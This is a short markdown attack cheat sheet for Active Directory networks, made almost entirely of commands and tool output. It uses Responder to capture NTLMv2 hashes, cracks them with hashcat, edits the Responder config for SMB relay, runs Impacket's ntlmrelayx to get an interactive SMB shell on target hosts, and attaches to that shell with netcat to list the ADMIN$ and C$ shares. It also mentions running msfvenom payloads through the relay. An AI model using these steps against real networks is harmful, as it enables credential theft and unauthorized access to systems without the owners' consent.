## Active Directory Attack Guide.

#### Capture NTLMv2 Hashes with Responder
```
sudo responder -I eth0 - rdwv
```
#### Crack the Hash with Hashcat
```
hashcat -m 5600 hash rockyou.txt
--help:
MODE | 5600 | NetNTLMv2 | Network Protocol
```

#### Edit the Responder Config File for SMB Relay Attack
```
nano /etc/responder/responder.conf

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
```

#### Running Responder
```
sudo responder -I eth0 - rdwv
```
#### Starting NTLMrelayx part of Impacket Tools
```
ntlmrelayx.py -tf targets.txt -smb2support -i 
--help:
-i -- intercative
-e -- execute payload (test.exe) (Creating a payload with msfvenom)
-c -- run a command (whoami)

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from DOMAIN/user@192.168.164.141 controlled, attacking target smb://192.168.164.142
[*] Authenticating against smb://192.168.164.142 as DOMAIN/USER SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-4: Connection from DOMAIN/USER@192.168.164.141 controlled, but there are no more targets left!
[-] SMB SessionError: STATUS_NO_SUCH_FILE({File Not Found} The file %hs does not exist.)

```

#### Netcat Listener on localhost
```
nc 127.0.0.1 11000
Type help for list of commands
# shares
ADMIN$
C$
IPC$
Share
```


